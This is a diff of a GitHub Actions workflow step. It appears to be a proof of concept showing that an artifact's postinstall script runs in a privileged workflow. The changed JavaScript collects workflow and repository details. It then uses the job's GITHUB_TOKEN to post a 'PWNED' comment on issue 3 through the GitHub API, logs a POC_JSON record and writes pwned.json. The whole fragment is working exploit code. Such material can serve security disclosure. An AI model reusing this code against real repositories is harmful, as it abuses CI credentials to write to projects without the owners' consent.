@@ -25,17 +25,24 @@ jobs:
             const info = {
               marker: 'PWNED_POSTINSTALL_IN_PRIVILEGED_WORKFLOW',
               workflow: process.env.GITHUB_WORKFLOW,
+              workflow_ref: process.env.GITHUB_WORKFLOW_REF,
               event: process.env.GITHUB_EVENT_NAME,
               repo: process.env.GITHUB_REPOSITORY,
-              hasToken: Boolean(process.env.GITHUB_TOKEN),
-              tokenLen: (process.env.GITHUB_TOKEN || '').length
+              hasToken: Boolean(process.env.GITHUB_TOKEN)
             };
             try {
-              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/pulls', {
-                headers: { Authorization: 'Bearer ' + process.env.GITHUB_TOKEN, Accept: 'application/vnd.github+json' }
+              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/3/comments', {
+                method: 'POST',
+                headers: {
+                  Authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
+                  Accept: 'application/vnd.github+json',
+                  'Content-Type': 'application/json',
+                  'X-GitHub-Api-Version': '2022-11-28'
+                },
+                body: JSON.stringify({ body: 'PWNED via artifact postinstall. workflow=' + process.env.GITHUB_WORKFLOW + ' ref=' + process.env.GITHUB_WORKFLOW_REF + ' event=' + process.env.GITHUB_EVENT_NAME + ' token=' + Boolean(process.env.GITHUB_TOKEN) })
               });
-              info.apiStatus = r.status;
-            } catch (e) { info.apiError = String(e); }
+              info.commentStatus = r.status;
+            } catch (e) { info.err = String(e); }
             console.log('POC_JSON ' + JSON.stringify(info));
             fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/pwned.json', JSON.stringify(info));
           })();
